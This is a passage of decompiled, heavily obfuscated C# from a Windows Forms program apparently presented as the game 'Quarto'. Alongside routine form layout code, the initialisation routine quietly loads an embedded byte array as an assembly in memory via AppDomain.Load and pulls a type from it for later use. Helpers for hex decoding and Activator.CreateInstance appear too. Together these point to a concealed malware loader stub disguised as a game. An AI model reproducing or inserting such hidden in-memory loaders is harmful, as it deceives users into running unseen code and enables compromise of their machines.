					num = (int)(num2 * 1133244931) ^ -1178865370;
					continue;
				case 28u:
					CharArray(array, string.Empty);
					num = ((int)num2 * -1432061839) ^ -565017491;
					continue;
				case 27u:
					num = (int)((num2 * 1486592670) ^ 0x71754227);
					continue;
				case 26u:
					num = (int)((num2 * 210256666) ^ 0x1317AC74);
					continue;
				case 25u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					Form1.smethod_64((Control)(object)button2, 4);
					num = ((int)num2 * -646835406) ^ -1124727530;
					continue;
				case 24u:
					Form1.smethod_59((Control)(object)this);
					num = (int)(num2 * 1418596309) ^ -248462072;
					continue;
				case 23u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = ((int)num2 * -119161262) ^ -1553017514;
					continue;
				case 22u:
					num3++;
					num = ((int)num2 * -673194658) ^ -1358932004;
					continue;
				case 21u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = ((int)num2 * -1667749491) ^ 0x8FE6E2E;
					continue;
				case 20u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = (int)(num2 * 1745586300) ^ -1844948991;
					continue;
				case 19u:
					num = (int)(num2 * 2011472066) ^ -457096040;
					continue;
				case 17u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					Form1.smethod_85((Control)(object)this, "Form1");
					num = (int)(num2 * 41370630) ^ -545791054;
					continue;
				case 16u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = ((int)num2 * -446269151) ^ 0x7F47FC01;
					continue;
				case 15u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					Form1.smethod_61((Control)(object)label1, "label1");
					num = (int)(num2 * 1620530731) ^ -176500719;
					continue;
				case 14u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = (int)((num2 * 1686566701) ^ 0xCB24E0B);
					continue;
				case 13u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = (int)((num2 * 1016315743) ^ 0x64592BE3);
					continue;
				case 12u:
					num = (int)(num2 * 1503815204) ^ -933179720;
					continue;
				case 11u:
					num = ((int)num2 * -419350531) ^ -1158228268;
					continue;
				case 10u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = (int)((num2 * 858194804) ^ 0x75EB9BC1);
					continue;
				case 9u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = (int)(num2 * 1142161193) ^ -1048003979;
					continue;
				case 8u:
					richTextBox1 = Form1.smethod_54();
					num = ((int)num2 * -1542666330) ^ 0x3CCAA4B7;
					continue;
				case 7u:
					num = ((int)num2 * -987476101) ^ -612862435;
					continue;
				case 6u:
					num = ((int)num2 * -231625765) ^ -153736325;
					continue;
				case 5u:
					num = ((int)num2 * -418378214) ^ -1469931186;
					continue;
				case 4u:
					Form1.smethod_61((Control)(object)label6, "label6");
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = ((int)num2 * -316696145) ^ -1822852543;
					continue;
				case 3u:
					num = (int)((num2 * 176927018) ^ 0x5BDA323D);
					continue;
				case 2u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1417571867) ^ -1891810853;
					continue;
				case 1u:
					label1 = Form1.smethod_57();
					label2 = Form1.smethod_57();
					num = (int)((num2 * 379827831) ^ 0x16258059);
					continue;
				case 0u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = ((int)num2 * -745978974) ^ 0x22AD0C63;
					continue;
				default:
					return;
				case 35u:
					break;
				case 18u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = default(Assembly);
		while (true)
		{
			int num = -446583640;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xAAA67DBBu) % 3u)
				{
				case 2u:
					goto IL_0003;
				case 0u:
					break;
				default:
					PerformTable(q);
					return;
				}
				break;
				IL_0003:
				q = ContextAdd(Level);
				num = ((int)num2 * -341177744) ^ 0x2A35D75C;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = 778411834;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x715C91CEu) % 3u)
				{
				case 2u:
					goto IL_0003;
				case 0u:
					break;
				default:
					return result;
				}
				break;
				IL_0003:
				result = Form1.smethod_94(Form1.smethod_93(), Position);
				num = ((int)num2 * -896655008) ^ -524335341;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		while (true)
		{
			int num = 561765053;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x11B0C7AFu) % 3u)
				{
				case 1u:
					goto IL_0003;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
				IL_0003:
				ComMember = Form1.smethod_95(Q3)[24];
				num = (int)((num2 * 330243838) ^ 0x5AD9A7E7);
			}
		}
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
